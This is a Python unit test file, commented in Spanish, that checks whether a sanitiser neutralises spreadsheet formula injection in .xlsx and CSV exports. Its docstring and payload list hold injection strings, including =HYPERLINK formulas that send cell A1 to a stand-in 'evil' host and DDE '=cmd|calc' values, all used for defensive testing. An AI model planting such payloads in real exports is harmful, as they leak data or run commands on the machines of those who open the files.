"""Las exportaciones no deben ejecutar formulas de la base del cliente.

Un valor de texto que empieza por `=` se convierte en formula cuando se abre el
.xlsx. Reproducido con openpyxl: una celda de texto con
`=HYPERLINK("http://evil/?d="&A1,"click")` se escribe en el XML como `<f>...</f>`,
y el `.xlsx` lo descarga y abre un C-Level.

El mismo riesgo aplica al CSV de compliance de `/audit/export`, porque
`csv.QUOTE_MINIMAL` no protege contra formulas.
"""
import unittest

from main import app  # noqa: F401

from app.core.security import sanitize_spreadsheet_value


class TestSpreadsheetFormulaInjection(unittest.TestCase):
    DANGEROUS = [
        '=HYPERLINK("http://evil.example/?d="&A1,"click")',
        '=1+1',
        '+1+1',
        '@SUM(A1:A9)',
        '-2+3',
        '\t=cmd|calc',
        '\r=cmd|calc',
    ]

    def test_formula_prefixes_are_neutralized(self):
        for payload in self.DANGEROUS:
            with self.subTest(payload=payload[:24]):
                out = sanitize_spreadsheet_value(payload)
                self.assertNotEqual(
                    out[:1], "=",
                    "el valor sigue empezando por '=': openpyxl lo escribiria como <f>",
                )
                self.assertTrue(
                    out.startswith("'"),
                    f"falta el apostrofo de escape: {out!r}",
                )

    def test_text_is_preserved_after_escaping(self):
        # El apostrofo es el escape estandar: Excel lo oculta y muestra el texto.
        payload = '=HYPERLINK("x")'
        self.assertEqual(sanitize_spreadsheet_value(payload)[1:], payload)

    def test_harmless_values_are_untouched(self):
        for value in ("Cliente Normal", "123", "12.345.678-9", "2026-07-01", "", "a=b"):
            with self.subTest(valor=value):
                self.assertEqual(sanitize_spreadsheet_value(value), value)

    def test_non_strings_pass_through(self):
        for value in (None, 0, 42, 3.14, True, False):
            with self.subTest(valor=repr(value)):
                self.assertEqual(sanitize_spreadsheet_value(value), value)


if __name__ == "__main__":
    unittest.main()
